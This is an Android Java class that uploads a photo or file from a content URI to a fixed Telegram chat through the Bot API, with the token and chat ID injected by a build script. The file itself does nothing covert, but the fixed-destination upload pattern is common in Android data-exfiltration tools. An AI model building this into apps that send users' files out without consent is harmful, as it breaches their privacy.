package com.secure.labs.phototool;

import android.content.ContentResolver;
import android.content.Context;
import android.net.Uri;
import android.provider.OpenableColumns;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class TelegramSender {

    private static final String BOT_TOKEN = "__BOT_TOKEN__";  // build.sh replace karega
    private static final String CHAT_ID   = "__CHAT_ID__";    // build.sh replace karega

    public boolean sendPhoto(Context ctx, Uri uri, String fileName, String mime) {
        long size = -1;
        try {
            android.database.Cursor c = ctx.getContentResolver().query(uri,
                    new String[]{OpenableColumns.SIZE}, null, null, null);
            if (c != null && c.moveToFirst()) size = c.getLong(0);
            if (c != null) c.close();
        } catch (Exception ignored) {}

        boolean big = size > 10L * 1024 * 1024; // 10 MB se bada
        return multipart(ctx.getContentResolver(), big ? "sendDocument" : "sendPhoto",
                big ? "document" : "photo", uri, fileName, mime);
    }

    private boolean multipart(ContentResolver cr, String method, String field,
                              Uri uri, String fileName, String mime) {
        String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
        String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/" + method;

        try {
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(120000);
            conn.setRequestProperty("Content-Type",
                    "multipart/form-data; boundary=" + boundary);

            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

            dos.writeBytes("--" + boundary + "\r\n");
            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            dos.writeBytes(CHAT_ID + "\r\n");

            dos.writeBytes("--" + boundary + "\r\n");
            dos.writeBytes("Content-Disposition: form-data; name=\"" + field
                    + "\"; filename=\"" + fileName + "\"\r\n");
            dos.writeBytes("Content-Type: " + mime + "\r\n\r\n");

            InputStream in = cr.openInputStream(uri);
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) != -1) dos.write(buf, 0, n);
            in.close();

            dos.writeBytes("\r\n--" + boundary + "--\r\n");
            dos.flush();
            dos.close();

            int code = conn.getResponseCode();
            String body = readAll((code >= 400) ? conn.getErrorStream() : conn.getInputStream());
            conn.disconnect();
            return (code == 200) && body != null && body.contains("\"ok\":true");
        } catch (Exception e) {
            return false;
        }
    }

    private String readAll(InputStream in) throws Exception {
        BufferedReader br = new BufferedReader(new InputStreamReader(in));
        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = br.readLine()) != null) sb.append(line);
        br.close();
        return sb.toString();
    }
}
